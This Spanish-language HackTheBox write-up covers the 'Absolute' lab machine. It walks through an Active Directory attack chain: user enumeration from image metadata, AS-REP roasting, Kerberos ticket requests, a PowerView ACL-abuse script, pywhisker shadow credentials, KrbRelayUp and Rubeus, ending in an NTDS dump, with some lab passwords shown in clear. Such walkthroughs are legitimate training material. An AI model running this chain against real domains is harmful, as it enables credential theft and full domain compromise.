---
title: Absolute - HackTheBox
categories: [ Windows ]
tags: [ HackTheBox ]
---

<img src="/assets/img/HTB/Absolute/Absolute.jpg">

Buenas! Hoy vamos a completar la máquina [Absolute](https://app.hackthebox.com/machines/Absolute) de la plataforma [HackTheBox](https://app.hackthebox.com), donde tocaremos los siguientes puntos:

- **Enumerating Active Directory users with Exiftool**
- **Kerberos Brute Force attack to validate users in the Domain Controller**
- **ASPREPRoast Attack - GetNPMUsers.py**
- **Requesting TGT (Ticket-Granting Ticket)**
- **LDAP Enumeration with CrackMapExec**
- **SMB Enumeration** 
- **Getting user credentials in SMB Server binary**
- **Bloodhound Enumeration**
- **Simulating a Active Directory enviroment in a Windows Server 2016 machine**
- **Using Pywhisker to create a PFX and its password**
- **Using GetTGTpkinit.py to obtain a TGT (Ticket-Granting Ticket)**
- **Using RunasCS and KrbRelay to get System Information**
- **Using Rubeus in order to get the NTLM Hash**
- **Dumping Domain Controller's NTDS with CrackMapExec**

## Enumeración

### Escaneo de puertos 

Como en toda máquina, comenzaremos con un escaneo de puertos, en mi caso, utilizaré la herramienta `nmap`

```sh
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.181 -oG allPorts
Nmap scan report for 10.10.11.181
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
47001/tcp open  winrm            syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49665/tcp open  unknown          syn-ack ttl 127
49666/tcp open  unknown          syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49673/tcp open  unknown          syn-ack ttl 127
49674/tcp open  unknown          syn-ack ttl 127
49675/tcp open  unknown          syn-ack ttl 127
49686/tcp open  unknown          syn-ack ttl 127
49691/tcp open  unknown          syn-ack ttl 127
49701/tcp open  unknown          syn-ack ttl 127
49705/tcp open  unknown          syn-ack ttl 127
59140/tcp open  unknown          syn-ack ttl 127
```

Ahora que tenemos todos los puertos, realizaremos un escaneo mucho más exhaustivo con nmap

```sh
❯ nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49673,49674,49675,49686,49691,49701,49705,59140 -sCV 10.10.11.181 -oN targeted
Nmap scan report for 10.10.11.181
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Absolute
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-05-02 03:25:26Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-05-02T03:26:34+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.absolute.htb
| Not valid before: 2023-05-01T13:35:11
|_Not valid after:  2024-04-30T13:35:11
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-05-02T03:26:33+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.absolute.htb
| Not valid before: 2023-05-01T13:35:11
|_Not valid after:  2024-04-30T13:35:11
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.absolute.htb
| Not valid before: 2023-05-01T13:35:11
|_Not valid after:  2024-04-30T13:35:11
|_ssl-date: 2023-05-02T03:26:34+00:00; +7h00m00s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.absolute.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.absolute.htb
| Not valid before: 2023-05-01T13:35:11
|_Not valid after:  2024-04-30T13:35:11
|_ssl-date: 2023-05-02T03:26:33+00:00; +7h00m00s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49686/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
49705/tcp open  msrpc         Microsoft Windows RPC
59140/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-05-02T03:26:24
|_  start_date: N/A
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
```

Si nos fijamos bien, obtenemos el dominio `absolute.htb` y el subdominio `dc.absolute.htb`, vamos a añadirlos al archivo `/etc/hosts`

### Enumeración SMB (TCP -> 445)

Vamos a recopilar un poquito de información sobre la máquina, utilizaremos la herramienta `crackmapexec`

```sh
❯ cme smb 10.10.11.181
SMB         10.10.11.181    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
```

Nos percatamos que tiene el SMB firmado, asi que descartaremos el uso de la herramienta `responder`

### Enumeración HTTP (TCP -> 80)

Accedemos al servicio web y nos encontramos lo siguiente

![](/assets/img/HTB/Absolute/web.png)

En la web no hay nada que nos llame la atención, menos las imagenes que están en la web, asi que las descargaremos recursivamente con el siguiente comando

```sh
❯ for i in {1..10}; do wget "http://absolute.htb/images/hero_$i.jpg" &>/dev/null; done
```

Ahora en nuestro directorio de trabajo tenemos todas las imágenes, analizaremos las imagenes con `exiftool` en busca de metadatos

## Explotación

### Enumeración Usuarios AD

```sh
❯ exiftool hero_1.jpg
ExifTool Version Number         : 12.57
File Name                       : hero_1.jpg
Directory                       : .
File Size                       : 407 kB
File Modification Date/Time     : 2022:06:07 21:45:20+02:00
File Access Date/Time           : 2023:05:01 22:37:08+02:00
File Inode Change Date/Time     : 2023:05:01 22:37:44+02:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Little-endian (Intel, II)
X Resolution                    : 72
Y Resolution                    : 72
Resolution Unit                 : inches
Artist                          : James Roberts
Y Cb Cr Positioning             : Centered
Quality                         : 60%
XMP Toolkit                     : Image::ExifTool 11.88
Author                          : James Roberts
Creator Tool                    : Adobe Photoshop CC 2018 Macintosh
Derived From Document ID        : 6413FD608B5C21D0939F910C0EFBBE44
Derived From Instance ID        : 6413FD608B5C21D0939F910C0EFBBE44
Document ID                     : xmp.did:887A47FA048811EA8574B646AF4FC464
Instance ID                     : xmp.iid:887A47F9048811EA8574B646AF4FC464
DCT Encode Version              : 100
APP14 Flags 0                   : [14], Encoded with Blend=1 downsampling
APP14 Flags 1                   : (none)
Color Transform                 : YCbCr
Image Width                     : 1900
Image Height                    : 1150
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 1900x1150
Megapixels                      : 2.2
```

Nos podemos percatar de un supuesto autor `James Robors`, así que ahora analizaremos todas las imagenes descargadas en busca de más posibles usuarios

```sh
❯ exiftool hero_*.jpg  | grep Author
Author                          : James Roberts
Author                          : Michael Chaffrey
Author                          : Donald Klay
Author                          : Sarah Osvald
Author                          : Jeffer Robinson
Author                          : Nicole Smith
```

Obtenemos una lista de posibles usuarios asi que las modificaremos para adaptarla a la posible lista de usuario normales en entornos de AD

![](/assets/img/HTB/Absolute/usuarios.png)

### Fuerza bruta Kerberos (Kerbrute)

Para comprobar si los usuarios anteriormente conseguidos son válidos en el entorno de AD, usaremos la herramienta `Kerbrute` para validarlos

![](/assets/img/HTB/Absolute/kerbrute.png)

Tras lanzar el ataque vemos que existen varios usuarios válidos, asi que el siguiente paso será comprobar si alguno de estos usuario son vulnerables a ASP-REProast

### ASP-REProast 

Primero que todo vamos a comprobar si es vulnerable a ASP-REProast usando la herramienta `GetNPUsers` de la suite de [Impacket](https://github.com/fortra/impacket), observamos que el usuario `klay.d` es vulnerable, conseguimos hash

![](/assets/img/HTB/Absolute/Kerberoast.png)

Para crackear el hash utilizaremos la herramienta `John The Ripper`

![](/assets/img/HTB/Absolute/john.png)

### Ticket-Granting-Ticket (TGT) -> d.klay

Conseguimos las credenciales `d.klay:Darkmoonsky248girl`, utilizaremos la herramienta `CrackMapExec` para ver si podemos enumerar los recursos compartidos a nivel de red

```sh
❯ cme smb 10.10.11.181 -u 'd.klay' -p 'Darkmoonsky248girl'
SMB         10.10.11.181    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.181    445    DC               [-] absolute.htb\d.klay:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION 
```

No funciona, lo más probable es que solo podamos utilizar el protocolo de autenticación `Kerberos`, asi que tendremos que solicitar un TGT válido para obtener acceso, para conseguir el TGT utilizaremos la herramienta `getTGT.py` de la suite de `Impacket`

![](/assets/img/HTB/Absolute/tgt.png)

Ahora que tenemos el ticket lo exportaremos a la variable `KRB5CCNAME`

```sh
❯ export KRB5CCNAME=/home/l4nder/Escritorio/HackTheBox/Absolute/content/d.klay.ccache
```

### TGT -> svc_smb

Aún con el ticket no podremos enumerar los archivos compartidos a nivel de red, asi que enumeraremos el servicio LDAP a través de la autenticación kerberos, pero antes de lanzar la enumeración, tendremos que sincronizar la hora con la de la máquina victima, usaremos la herramienta `ntpdate`

```sh
❯ ntpdate 10.10.11.181
2023-05-02 06:05:03.800568 (+0200) +25200.140667 +/- 0.132597 10.10.11.181 s1 no-leap
CLOCK: time stepped by 25200.140667
```

Ahora lanzaremos el `CrackMapExec` para enumerar LDAP

![](/assets/img/HTB/Absolute/ldap.png)

Encontramos lo que parece ser la contraseña del usuario `svc_smb` con el que es probable que podamos conectarnos a los recursos compartidos por smb

```sh
svc_smb:AbsoluteSMBService123!
```

Recordemos que el único método de autenticación que nos funcionaba era a través de Kerberos, por lo que tenemos que conseguir el TGT del usuario `svc_smb`

![](/assets/img/HTB/Absolute/tgt1.png)

Ahora utilizaremos `CrackMapExec` para comprobar si de verdad tendremos acceso a los recursos compartidos

![](/assets/img/HTB/Absolute/cme.png)

Ahora tenemos acceso a los recursos, asi que añadiremos `--shares` al final para listar los recursos

![](/assets/img/HTB/Absolute/smb.png)

Ahi se pueden ver los recursos a los que tenemos acceso, usaremos la herramienta `smbclient` para conectarnos a ellos, recordad conectaros por `Kerberos`

![](/assets/img/HTB/Absolute/smb1.png)

Nos descargamos los archivos para analizarlos mejor en nuestro equipo

El archivo `compiler.sh` no tiene nada interesante, por lo que vamos a pasar el .exe a una máquina Windows para analizarlo

```sh
 #!/bin/bash
 
 nim c -d:mingw --app:gui --cc:gcc -d:danger -d:strip $1
 ```

 Vamos a ejecutar el binario a ver que sucede

 ![](/assets/img/HTB/Absolute/exe.png)

 Al ejecutarlo no sucede nada asi que abramos wireshark para ver si el binario envia cualquier tipo de datos. Conseguimos las siguientes credenciales `m.lovegod:AbsoluteLDAP2022!`

 ### TGT -> m.lovegod

 Ahora al tener credenciales generaremos de nuevo otro TGT y posteriormente lanzaremos `Bloodhound` para enumerar el dominio y buscar posibles vectores de ataque.

 ![](/assets/img/HTB/Absolute/m.lovegod.png)

 Una vez lo tenemos lanzaremos `Bloodhound` y se nos generarán archivos .json que tendremos que importar más adelante

 ![](/assets/img/HTB/Absolute/bloodhound.png)

 Como podemos ver en la imagen, tenemos un usuario `winrm_user` con el que es probable que podamos acceder a la máquina y desde ahí escalar privilegios

 - **El usuario M.Lovegod es dueño del grupo Network Audit al que debemos pertenecer para posteriormente migrarnos al usuario WINRM**

Para poder unirnos a este grupo debemos de realizar varias cosas

- **Importar el módulo Powerview.ps1 y ejecutar los comandos que BloodHound nos proporciona para unirnos a este grupo**

![](/assets/img/HTB/Absolute/bloodhound_comando.png)

#### Emulación Windows Server 2019

Una vez estamos en la máquina Windows debemos realizar varios cambios:

- Tenemos que instalar Windows Server 2019 con el rol de AD
- Tendremos que añadir la IP de la máquina victima a la configuración de red en el apartado DNS
- Editar el archivo "C:\Windows\System32\Drivers\etc\hosts" y añadir el dominio absolute.htb
- Sincronizar la hora del Windows Server con la del dominio dc.absolute.htb

```sh
Import-Module .\PowerView.ps1 
$SecPassword = ConvertTo-SecureString "AbsoluteLDAP2022!" -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential("Absolute.htb\m.lovegod", $SecPassword)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Network Audit" -Rights all -DomainController dc.absolute.htb -PrincipalIdentity "m.lovegod"
Add-ADPrincipalGroupMembership -Identity m.lovegod -MemberOf "Network Audit" -Credential $Cred -server dc.absolute.htb
```

![](/assets/img/HTB/Absolute/power.png)

Una vez hemos ejecutado estos comandos en la powershell tendremos que ir rápidamente a nuestra máquina atacante para ejecutar el siguiente comando

### TGT -> winrm_user 

```sh
❯ python3 pywhisker.py -d absolute.htb -u "m.lovegod" -k --no-pass -t "winrm_user" --action "add"
```

![](/assets/img/HTB/Absolute/pfx.png)

Al ejecutar el comando generamos un certificado con extensión `pfx` y su contraseña, de esta forma podremos usar el certificado para generar un TGT del usuario `winrm_user` a través del script [getTGTPKinit.py](https://raw.githubusercontent.com/dirkjanm/PKINITtools/master/gettgtpkinit.py). 

![](/assets/img/HTB/Absolute/winrm_user-tgt.png)

Ya tenemos el TGT del usuario `winrm_user`, por lo que exportaremos la variable de entorno `KRB5CCNAME`

```sh
❯ export KRB5CCNAME=/home/l4nder/Escritorio/HackTheBox/Absolute/content/winrmCcache
```

Ahora que tenemos el TGT, nos conectaremos con la herramienta `Evil-WinRM` con este usuario, conseguimos la user flag

![](/assets/img/HTB/Absolute/evil_winrm.png)

## Escalada de Privilegios

Antes de comenzar con al escalada de privilegios tenemos que saber que solo existe un Administrador del Dominio y que ya estamos en el DC por lo que si conseguimos escalar privilegios seremos administradores del AD y podremos realizar un volcado del NTDS, de esta forma podremos usar el hash NTLM para conectarnos como Administrador.

El primer paso es generar y agregar una credencial oculta mediante KrbRelayUp

![](/assets/img/HTB/Absolute/krbrelayup.png)

Al ejecutar el comando obtenemos un certificado y la contraseña del mismo, que usaremos a continuación para generar un TGT con Rubeus como DC$ y así conseguir un hash NTLM

![](/assets/img/HTB/Absolute/rubeus.png)

Una vez tenemos el hash NTLM lo usamos para volcar el NTDS con `CrackMapExec`

![](/assets/img/HTB/Absolute/ntds.png)

Una vez tenemos el NTDS volcado usamos el hash para conectarnos a través de WinRM como el usuario administrador y podremos leer la flag de root

![](/assets/img/HTB/Absolute/root.png)